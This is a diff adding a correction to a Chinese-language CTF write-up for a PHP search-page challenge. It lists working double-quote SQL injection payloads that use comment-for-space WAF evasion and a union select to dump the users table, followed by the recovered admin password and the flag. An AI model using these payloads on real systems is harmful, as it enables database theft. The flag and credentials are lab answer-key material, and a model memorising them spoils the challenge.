@@ -46,3 +46,20 @@ PHPAbUsers（PHP）。`search.php` 只做 `username` 存在性查询：`admin` �
   连 `admin'` 本身也是 `No results` → 说明查询对引号做了转义（参数化），WAF 只是外层。
 - 目录/页面只有 `index.php`、`login.php`、`search.php`；`login.php` 任意输入都只回 `Error!`。
 - 结论：本场未找到可用的注入或凭据。
+
+## 更正与解出（2026-10-28）
+
+上一节「参数化」的判断是错的：**只有单引号被转义，双引号没有**，查询用的是双引号。
+
+```text
+admin"#                                        → User exists: admin
+admin"/**/or/**/1=1#                           → User exists: admin
+admin"/**/union/**/select/**/1,@@version,3#    → User exists: 5.7.15
+admin"/**/union/**/select/**/1,group_concat(concat_ws(0x3a,id,username,password)),3/**/from/**/users#
+                                               → User exists: 1:admin:ThisIsBestPassword
+```
+
+- 列数 3，第 2 列回显；`/**/` 代替空格绕过 WAF 的 `and`/`or`/空格过滤，`#` 收尾。
+- `admin:ThisIsBestPassword` 登录 `login.php`，响应正文直接给出
+  `Congratz, flag is flag{14f3fa70-6132-4570-985c-f9dfcdc6db26}`。
+- 教训：单引号被转义 ≠ 参数化，必须把双引号也单独测一次。
